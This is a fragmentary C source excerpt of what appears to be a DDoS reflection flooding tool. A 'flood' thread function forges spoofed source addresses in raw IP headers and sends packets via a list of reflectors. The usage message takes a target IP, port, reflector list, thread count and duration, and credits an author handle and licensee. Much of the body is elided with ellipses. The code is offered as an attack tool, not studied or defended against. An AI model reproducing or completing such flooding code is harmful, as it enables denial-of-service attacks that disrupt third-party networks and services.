...
void *flood(void *par1)
{
	...
	while (1)
	{
		...
		{
			if (netmask < 32) {
				iph->saddr = htonl(ntohl(sin.sin_addr.s_addr) + (((uint32_t)rand_cmwc()) >> netmask));
			} else {
				iph->saddr = sin.sin_addr.s_addr;
			}
			iph->daddr = list_node->data.sin_addr.s_addr;
		...
		else
		{
			...
			if (netmask < 32) {
				iph->daddr = htonl(ntohl(sin.sin_addr.s_addr) + (((uint32_t)rand_cmwc()) >> netmask));
			} else {
...
int main(int argc, char *argv[])
{
	if (argc < 4)
	{
		fprintf(stdout, "Usage: %s <target IP> <port> <reflectors list> <threads> <time>\nMethods by @yfork - Licensed to Nxver\n", argv[0]);
		exit(-1);
	}
	...
	netmask = atoi((argument += strlen(argument)) - 2);
